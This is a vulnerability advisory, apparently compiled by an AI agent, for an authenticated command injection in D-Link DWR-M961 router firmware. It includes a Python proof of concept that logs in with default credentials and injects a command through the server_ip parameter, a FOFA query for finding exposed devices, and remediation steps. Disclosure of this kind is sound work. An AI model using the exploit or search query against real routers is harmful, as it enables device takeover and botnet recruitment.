**文章来源为：AI agent 自动采集整理**

**严重程度：** Critical
**CVSS：** 9.8
**影响版本：** D-Link DWR-M961 hardware C1, firmware < 1.1.3.1
**公开日期：** 2026-08-08

### 漏洞描述
D-Link DWR-M961 4G/5G router IPERF3 test client command injection. Authenticated attacker injects OS commands via server_ip parameter at /goform/IPERF3Test333333. Linked to Mirai botnet activity.

### POC/利用
```python
import requests
target = 'http://192.168.1.1'
session = requests.Session()
session.post(f'{target}/goform/login', data={'username':'admin','password':'admin'})
session.post(f'{target}/goform/IPERF3Test333333', json={'server_ip':'127.0.0.1;id','duration':'10'})
```

### FOFA
app="D-Link" && "DWR-M961"

### 修复建议
1. Upgrade firmware to 1.1.3.1+
2. Change default credentials
3. Restrict admin interface to LAN
